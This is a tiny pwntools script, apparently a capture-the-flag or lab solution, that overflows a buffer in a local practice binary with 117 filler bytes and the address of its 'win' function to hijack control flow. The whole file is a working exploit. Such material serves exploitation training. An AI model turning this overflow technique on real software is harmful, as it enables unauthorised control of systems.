# coding: utf-8
from pwn import *
p=process("./withoutpie")
elf = ELF("./withoutpie")
winad = elf.sym["win"]
payload = b"A"*117 + p32(winad)
p.recv()
p.sendline(payload)
p.recv()
